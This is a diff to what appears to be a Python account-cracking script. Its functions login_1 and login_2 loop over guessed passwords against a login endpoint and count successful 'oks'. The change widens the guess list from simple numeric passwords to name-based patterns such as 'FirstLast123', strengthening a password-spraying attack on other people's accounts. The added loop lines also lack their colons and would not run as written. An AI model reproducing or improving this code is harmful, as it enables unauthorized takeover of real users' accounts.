@@ -369,7 +369,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANO-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in  ('123456', '1234567', '12345678', '123456789'):
+        for pw in  ('123456', '1234567', '12345678', '123456789', '1234567890', '12345', '12345678910', 'First123', 'Last123', 'FirstLast', 'FirstLast123', 'FirstLast1234', 'FirstLast@123', 'First_Last', 'First.Last123')
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -429,7 +429,7 @@ def login_1(uid):
 def login_2(uid):
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANO-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
-    for pw in ('123456', '123123', '123456', '1234567', '12345678', '123456789'):
+    for pw in ('123456', '1234567', '12345678', '123456789', '1234567890', '12345', '12345678910', 'First123', 'Last123', 'FirstLast', 'FirstLast123', 'FirstLast1234', 'FirstLast@123', 'First_Last', 'First.Last123')
         try:
             with requests.Session() as session:
                 headers = {
